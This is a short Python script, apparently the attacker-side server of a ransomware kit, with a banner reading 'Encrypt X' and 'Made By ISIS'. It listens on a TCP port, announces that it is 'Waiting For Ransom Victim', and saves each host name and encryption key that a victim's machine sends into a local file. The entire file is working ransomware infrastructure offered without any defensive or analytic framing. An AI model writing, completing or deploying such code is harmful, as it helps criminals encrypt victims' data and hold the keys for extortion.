from ipaddress import ip_address
import socket
import os
import colorama
from colorama import Fore
from os import system

def water(text):
    system(""); faded = ""
    green = 10
    for line in text.splitlines():
        faded += (f"\033[38;2;0;{green};255m{line}\033[0m\n")
        if not green == 255:
            green += 15
            if green > 255:
                green = 255
    return faded

print(water("""
    ______                            __     _  __    
   / ____/___  ____________  ______  / /_   | |/ /    
  / __/ / __ \/ ___/ ___/ / / / __ \/ __/   |   /     
 / /___/ / / / /__/ /  / /_/ / /_/ / /_    /   |      
/_____/_/ /_/\___/_/   \__, / .___/\__/   /_/|_|      
                      /____/_/      Made By ISIS                   
"""))


ip_address = '192.168.1.118'
port = 5678

print('Creating Socket')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((ip_address, port))
    print(f'[!] Waiting For Ransom Victim [!]')
    s.listen(1)
    conn, addr = s.accept()
    print(f'[>] Connection From {addr} Successful')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key+'\n')
            break
        print(f'[>] Connection Completed and Closed')


